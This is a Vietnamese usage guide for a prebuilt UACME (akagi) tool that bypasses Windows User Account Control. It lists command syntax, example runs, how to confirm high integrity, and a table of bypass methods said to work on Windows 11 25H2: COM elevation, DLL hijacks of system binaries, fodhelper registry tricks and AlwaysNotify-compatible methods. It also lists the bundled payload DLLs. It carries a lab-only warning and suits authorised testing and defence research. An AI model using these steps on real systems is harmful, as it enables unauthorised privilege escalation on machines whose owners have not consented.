# Hướng dẫn chạy UACME (đã build sẵn)

> ⚠️ Chỉ dùng trên máy của mình / lab được phép kiểm thử. Một số method có drop file vào thư mục hệ thống.

## Yêu cầu

- Chạy bằng tài khoản **quản trị viên** (thành viên nhóm Administrators)
- Mở **cmd thường** (KHÔNG phải "Run as administrator") — nếu chạy từ cmd đã nâng quyền, tool sẽ từ chối (`STATUS_NOT_SUPPORTED`)
- UAC ở mức mặc định; riêng các method 34, 59, 81, 83, 84, 85 chạy được cả khi UAC để "Always notify"

## Cú pháp

```
akagi64.exe <method> [đường dẫn lệnh cần nâng quyền]
```

- Không truyền `[lệnh]` → tự mở **cmd.exe nâng quyền**
- Ví dụ:

```
cd /d D:\VCS\UACME\Bin
akagi64.exe 41
akagi64.exe 23
akagi64.exe 61 C:\Windows\System32\calc.exe
akagi32.exe 41
```

- Kiểm tra đã nâng quyền: gõ `whoami /groups` trong cửa sổ cmd mới mở ra, tìm nhóm `S-1-16-12288` (High Integrity).

## Method gợi ý trên Windows 11 25H2 (build 26200)

| Method | Kỹ thuật | Ghi chú |
|---|---|---|
| **41** | COM CMLuaUtil | Đáng tin cậy nhất, nên thử đầu tiên |
| **23** | DLL hijack pkgmgr.exe (DismCore.dll) | Kinh điển, vẫn hoạt động |
| **33** | Registry fodhelper.exe | Fileless, đơn giản |
| **61** | Registry slui.exe / changepk.exe | |
| **67** | Shell protocol ms-settings | |
| **70** | Registry fodhelper/computerdefaults (V3ded) | |
| **76** | DLL hijack iscsicpl.exe | |
| **77** | DLL hijack mmc.exe (atl.dll) | |
| **81** | QuickAssist.exe | Tương thích AlwaysNotify |
| **84** | TabTip.exe | Tương thích AlwaysNotify |
| **85** | Narrator.exe | Tương thích AlwaysNotify |
| **59** | AppInfo ALPC + DebugObject | Tương thích AlwaysNotify |

- Method 30, 63 trở lên chỉ có trên bản **x64** (`akagi64.exe`)
- Các method "đã vá" trên 24H2/25H2 đã bị loại khỏi bảng method từ v3.7.0

## Bộ file trong Bin\

| File | Vai trò |
|---|---|
| `Akagi64.exe` / `Akagi32.exe` | Tool UAC bypass chính |
| `Fubuki32/64.dll`, `Akatsuki64.dll` | Payload đã nhúng sẵn vào Akagi (đã tạo .cd + secrets bằng Naka) |
| `Naka32/64.exe` | Tool nén/mã hóa payload (chỉ cần khi rebuild) |
| `UacInfo64.exe` | Dump thông tin cấu hình UAC (x64 only) |
